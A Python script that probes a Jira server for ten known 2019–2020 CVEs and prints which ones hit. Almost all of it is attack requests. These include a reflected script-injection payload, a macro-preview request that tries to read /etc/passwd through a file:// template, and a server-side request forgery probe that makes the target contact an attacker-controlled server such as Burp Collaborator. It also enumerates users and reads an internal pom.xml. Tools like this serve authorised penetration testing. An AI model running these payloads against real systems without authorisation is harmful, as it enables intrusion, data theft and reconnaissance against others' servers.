import requests
from optparse import OptionParser
import sys
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
parser = OptionParser()

parser.add_option("-u", "--url", dest="url",
    help="Enter your desired action", default='NotDefined')
parser.add_option("-c", "--cookie", dest="cookie",
    help="Enter your jira session cookie", default='NotDefined')
parser.add_option("-s", "--server", dest="server",
    help="Enter your owned http server (Ex. Burp Collaborator)", default='http://127.0.0.1')

(options, args) = parser.parse_args()

target_url = options.url
if "http" not in target_url:
    print("[-] Please Enter A Valid URL.\nRight Format: http(s)://example.tld")
    sys.exit(0)

target_url = target_url if "/" != target_url[-1] else target_url[:-1]

http_headers = {
    "Connection": "close",
    "Accept": "*/*",
    "Referer": target_url,
    "User-Agent": "Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0"
}

def CVE202014179(url):
    target_address = rf"{url}/secure/QueryComponent!Default.jspa"
    response = requests.get(target_address, headers=http_headers, verify=False)
    keyword = '{"searchers":'
    if keyword.lower() in response.text.lower():
        return True, target_address
    return False, target_address

def CVE202014181(url):
    target_address = rf"{url}/secure/ViewUserHover.jspa?username=admin"
    response = requests.get(target_address, headers=http_headers, verify=False)
    keyword = "Your session has timed out"
    if keyword.lower() in response.text.lower():
        return False, target_address
    return True, target_address

def CVE202014178(url):
    target_address = rf"{url}/browse.DefinitelyNotExist"
    response = requests.get(target_address, headers=http_headers, verify=False)
    keyword1 = "Project Does Not Exist"
    keyword2 = "The project or issue you are trying to view does not exist"
    if (keyword1.lower() in response.text.lower()) and (keyword2.lower() in response.text.lower()):
        return True, target_address
    return False, target_address

def CVE20193402(url):
    target_address = rf"{url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search"
    response = requests.get(target_address, headers=http_headers, verify=False)
    keyword1 = "<script>alert"
    if keyword1.lower() in response.text.lower():
        return True, target_address
    return False, target_address

def CVE201911581(url):
    target_address = rf"{url}/secure/ContactAdministrators!default.jspa"
    response = requests.get(target_address, headers=http_headers, verify=False)
    keyword1 = "Your Jira administrator has not yet configured this contact form"
    if keyword1.lower() in response.text.lower():
        return False, target_address
    return True, target_address

def CVE20193396(url,cookie):
    target_address = rf"{url}/rest/tinymce/1/macro/preview"
    http_headers = {
        "Accept": "text/plain, */*; q=0.01",
        "Referer": target_url,
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json; charset=utf-8",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Length": "167",
        "X-Forwarded-For": "127.0.0.2",
        "Connection": "keep-alive",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        "cookie": f"JIRASESSIONID={cookie}"

    }
    body = f'{{"contentId":"1","macro":{{"name":"widget","params":{{"url":"{target_url}/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"}},"body":""}}}}'
    response = requests.post(target_url, data=body, headers=http_headers, verify=False)
    keyword = "root:"
    if keyword.lower() in response.text.lower():
        return True, target_address
    return False, target_address

def CVE20198451(url):
    target_address = rf"{url}/plugins/servlet/gadgets/makeRequest?url=https://{options.server}:1337@example.com"
    response = requests.get(target_address, headers=http_headers, verify=False)
    return True, target_address

def CVE20198449(url):
    target_address = rf"{url}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"
    response = requests.get(target_address, headers=http_headers, verify=False)
    keyword1 = '{"users":{'
    if keyword1.lower() in response.text.lower():
        return True, target_address
    return False, target_address

def CVE20193403(url):
    target_address = rf"{url}/rest/api/2/user/picker?query=admin"
    response = requests.get(target_address, headers=http_headers, verify=False)
    keyword1 = '{"users":['
    keyword2 = '"key":"'
    if keyword1.lower() in response.text.lower() or keyword2.lower() in response.text.lower():
        return True, target_address
    return False, target_address

def CVE20198442(url):
    target_address = rf"{url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
    response = requests.get(target_address, headers=http_headers, verify=False)
    keyword1 = "ve found a dead link"
    keyword2 = "Username"
    keyword3 = "Password"
    if keyword1.lower() in response.text.lower():
        return False, target_address
    elif keyword2.lower() in response.text.lower() and keyword3.lower() in response.text.lower():
        return False, target_address
    return True, target_address

hit_CVEs = {}

print("Started Checking CVEs On Target JIRA.")

result,payload = CVE202014179(target_url)
if result:
    hit_CVEs["CVE-2020-14179"] = payload

result,payload = CVE202014181(target_url)
if result:
    hit_CVEs["CVE-2020-14181"] = payload

result,payload = CVE202014178(target_url)
if result:
    hit_CVEs["CVE-2020-14178"] = payload

result,payload = CVE20193402(target_url)
if result:
    hit_CVEs["CVE-2019-3402"] = payload

result,payload = CVE201911581(target_url)
if result:
    hit_CVEs["CVE-2019-11581"] = payload

if options.cookie != "NotDefined":
    result,payload = CVE20193396(target_url, options.cookie)
    if result:
        hit_CVEs["CVE-2019-3396"] = payload

result,payload = CVE20198451(target_url)
if result:
    hit_CVEs["CVE-2019-8451"] = "Check Your Server HTTP/DNS Request To Verify This Vulnerability"

result,payload = CVE20198449(target_url)
if result:
    hit_CVEs["CVE-2019-8449"] = payload

result,payload = CVE20193403(target_url)
if result:
    hit_CVEs["CVE-2019-3403"] = payload

result,payload = CVE20198442(target_url)
if result:
    hit_CVEs["CVE-2019-8442"] = payload

print("\nResults:\n------------------------")
for key, value in hit_CVEs.items():
    print(f"Hit Found On: {key}\nPayload: {value}\n")